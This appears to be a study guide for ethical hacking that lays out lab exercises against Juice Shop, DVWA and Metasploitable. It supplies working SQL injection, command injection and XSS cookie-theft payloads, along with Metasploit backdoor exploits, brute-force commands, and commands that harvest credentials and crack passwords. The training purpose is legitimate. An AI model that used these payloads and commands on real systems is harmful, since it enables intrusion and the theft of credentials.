# HackAgent Learning Path
## Your Journey to Ethical Hacking Mastery

---

## 🎯 Learning Tracks

### Track 1: Web Application Security (Beginner)
**Time:** 2-4 weeks  
**Labs:** Juice Shop, DVWA, WebGoat

### Track 2: Network Penetration Testing (Intermediate)
**Time:** 4-6 weeks  
**Labs:** Metasploitable 2/3, VulnHub

### Track 3: Advanced Exploitation (Advanced)
**Time:** 6-8 weeks  
**Labs:** HackTheBox, TryHackMe, Real Bug Bounties

---

## 📚 Track 1: Web Application Security

### Week 1: Setup & Reconnaissance

#### Day 1-2: Environment Setup
```bash
# Install Docker Desktop (Windows/Mac)
# https://www.docker.com/products/docker-desktop

# Start OWASP Juice Shop
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop

# Access at http://localhost:3000
```

#### Day 3-4: Web Reconnaissance
**Tools:** Browser DevTools, Burp Suite

**Exercise 1: Explore the Application**
1. Browse Juice Shop normally
2. Create an account
3. Add items to basket
4. Open DevTools (F12) → Network tab
5. Observe all API calls

**Exercise 2: Find Hidden Endpoints**
```
Look for:
- /api/* endpoints
- JavaScript files with routes
- Comments in HTML source
- robots.txt, sitemap.xml
```

**Exercise 3: Technology Fingerprinting**
```
Identify:
- Frontend framework (Angular)
- Backend (Node.js/Express)
- Database hints
- Authentication method (JWT)
```

#### Day 5-7: Directory Enumeration
**Tools:** gobuster, ffuf, dirsearch

```bash
# Using gobuster
gobuster dir -u http://localhost:3000 -w /usr/share/wordlists/dirb/common.txt

# Using ffuf
ffuf -u http://localhost:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

---

### Week 2: Injection Attacks

#### SQL Injection

**Concept:** Manipulating SQL queries through user input

**Juice Shop Challenge: Login as Admin**
```
Email: admin@juice-sh.op
Password: ' OR 1=1--

# Or try:
Email: ' OR 1=1--
Password: anything
```

**DVWA SQLi (Low Security)**
```
# Basic injection
1' OR '1'='1

# Union-based extraction
1' UNION SELECT user,password FROM users--

# Using SQLMap
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx; security=low" --dbs
```

**Practice Exercises:**
1. Extract all usernames from Juice Shop
2. Find the admin's password hash
3. Identify the database type
4. Dump the entire users table

#### Command Injection

**DVWA Command Injection (Low)**
```
# Basic
127.0.0.1; cat /etc/passwd

# Chained commands
127.0.0.1 && whoami
127.0.0.1 | id
127.0.0.1; ls -la
```

**Bypass Filters (Medium/High)**
```
# Bypass space filter
127.0.0.1;cat${IFS}/etc/passwd

# Bypass with newline
127.0.0.1%0aid

# Using backticks
127.0.0.1;`whoami`
```

---

### Week 3: Cross-Site Scripting (XSS)

#### Reflected XSS

**Juice Shop Search Bar**
```html
<script>alert('XSS')</script>

<img src=x onerror=alert('XSS')>

<iframe src="javascript:alert('XSS')">
```

#### Stored XSS

**DVWA Stored XSS (Low)**
```html
# In the Name field:
<script>alert(document.cookie)</script>

# Image tag:
<img src=x onerror=alert(document.cookie)>
```

#### DOM-based XSS

**Juice Shop DOM XSS**
```
# In search:
<iframe src="javascript:alert('xss')">
```

**Practice Exercises:**
1. Steal session cookies via XSS
2. Create a phishing form overlay
3. Bypass XSS filters (Medium/High)
4. Chain XSS with CSRF

---

### Week 4: Authentication & Access Control

#### Broken Authentication

**Brute Force Login**
```bash
# Using Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  localhost http-post-form \
  "/rest/user/login:email=^USER^&password=^PASS^:Invalid"
```

**JWT Manipulation**
```
1. Login to Juice Shop
2. Capture JWT token from localStorage
3. Decode at jwt.io
4. Try:
   - Change algorithm to "none"
   - Modify user role/id
   - Brute force weak secret
```

#### IDOR (Insecure Direct Object Reference)

**Juice Shop IDOR**
```
# View your basket
GET /rest/basket/1

# Try other users' baskets
GET /rest/basket/2
GET /rest/basket/3

# View other orders
GET /api/Orders/1
GET /api/Orders/2
```

**Practice Exercises:**
1. Access another user's basket
2. View admin's order history
3. Modify another user's profile
4. Find hidden admin functionality

---

## 📚 Track 2: Network Penetration Testing

### Week 1: Network Reconnaissance

#### Metasploitable 2 Setup
```
1. Download from SourceForge
2. Import OVA to VirtualBox
3. Set network to Host-Only
4. Boot and login: msfadmin/msfadmin
5. Get IP: ifconfig
```

#### Network Scanning
```bash
# Host discovery
nmap -sn 10.0.0.1/24

# Full port scan
nmap -sS -sV -O -p- -T4 10.0.0.1 -oN ms2_scan.txt

# Service enumeration
nmap -sV -sC 10.0.0.1

# Vulnerability scan
nmap --script vuln 10.0.0.1
```

**Expected Results (MS2):**
```
21/tcp   - vsftpd 2.3.4 (BACKDOOR!)
22/tcp   - OpenSSH 4.7p1
23/tcp   - telnet
80/tcp   - Apache 2.2.8
445/tcp  - Samba 3.X (VULNERABLE!)
3306/tcp - MySQL 5.0.51a
5432/tcp - PostgreSQL 8.3
6667/tcp - UnrealIRCd (BACKDOOR!)
```

---

### Week 2: Service Exploitation

#### Exploit 1: vsftpd 2.3.4 Backdoor
```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.0.1
exploit

# Result: Root shell!
```

#### Exploit 2: Samba usermap_script
```bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.0.0.1
set LHOST eth0  # Your interface
exploit
```

#### Exploit 3: UnrealIRCd Backdoor
```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.0.0.1
exploit
```

#### Exploit 4: distcc
```bash
use exploit/unix/misc/distcc_exec
set RHOSTS 10.0.0.1
exploit
```

---

### Week 3: Post-Exploitation

#### Shell Upgrade
```bash
# Get a proper TTY
python -c 'import pty;pty.spawn("/bin/bash")'

# Or
script /dev/null -c bash

# Background and fix terminal
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

#### Privilege Escalation
```bash
# Check current user
id
whoami

# Check sudo rights
sudo -l

# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Check writable files
find / -writable -type f 2>/dev/null
```

#### Credential Harvesting
```bash
# Password files
cat /etc/passwd
cat /etc/shadow  # If readable

# Config files
find / -name "*.conf" 2>/dev/null | xargs grep -l password
find / -name "config*" 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.mysql_history
```

---

### Week 4: Lateral Movement

#### Password Cracking
```bash
# Unshadow Linux passwords
unshadow /etc/passwd /etc/shadow > hashes.txt

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked
john --show hashes.txt
```

#### SSH Pivoting
```bash
# Port forwarding
ssh -L 8080:internal_host:80 user@pivot_host

# Dynamic SOCKS proxy
ssh -D 9050 user@pivot_host
proxychains nmap internal_network
```

---

## 📚 Track 3: Advanced Exploitation

### HackTheBox / TryHackMe

#### Getting Started
```bash
# Connect to HTB
sudo openvpn your-config.ovpn

# Verify connection
ping 10.10.10.x

# Start a machine from web interface
```

#### Methodology
```
1. RECON
   - nmap full scan
   - Web enumeration
   - Service fingerprinting

2. ENUMERATION
   - Directory busting
   - User enumeration
   - Version-specific vulns

3. EXPLOITATION
   - Searchsploit for CVEs
   - Manual exploitation
   - Metasploit as backup

4. POST-EXPLOITATION
   - Upgrade shell
   - Privesc enumeration
   - Capture flags

5. DOCUMENTATION
   - Screenshot everything
   - Note all commands
   - Write report
```

---

## 🛠️ Essential Tools Checklist

### Must-Have Tools
- [ ] Nmap
- [ ] Burp Suite
- [ ] Metasploit
- [ ] SQLMap
- [ ] Gobuster/ffuf
- [ ] Netcat
- [ ] John/Hashcat
- [ ] Wireshark

### Recommended Wordlists
- [ ] SecLists (https://github.com/danielmiessler/SecLists)
- [ ] rockyou.txt
- [ ] dirb wordlists

### Useful Resources
- [ ] OWASP Testing Guide
- [ ] HackTricks (book.hacktricks.xyz)
- [ ] PayloadsAllTheThings
- [ ] GTFOBins (Linux privesc)

---

## 📝 Progress Tracker

### Track 1: Web Security
- [ ] Set up Juice Shop
- [ ] Complete 10 easy challenges
- [ ] Complete 10 medium challenges
- [ ] Find SQLi vulnerability
- [ ] Execute XSS attack
- [ ] Bypass authentication
- [ ] Exploit IDOR

### Track 2: Network Pentesting
- [ ] Set up Metasploitable 2
- [ ] Full port scan
- [ ] Exploit vsftpd backdoor
- [ ] Exploit Samba
- [ ] Get root shell
- [ ] Extract password hashes
- [ ] Crack passwords

### Track 3: Advanced
- [ ] Join HackTheBox/TryHackMe
- [ ] Complete 5 Easy machines
- [ ] Complete 3 Medium machines
- [ ] Write professional report
- [ ] Start bug bounty hunting

---

## 🎓 Certifications Path

1. **CompTIA Security+** - Foundation
2. **eJPT** (eLearnSecurity) - Entry-level pentesting
3. **OSCP** (Offensive Security) - Industry standard
4. **OSWE** - Web exploitation
5. **OSCE3** - Advanced exploitation

---

*Happy Hacking! Remember: Always get authorization before testing!*

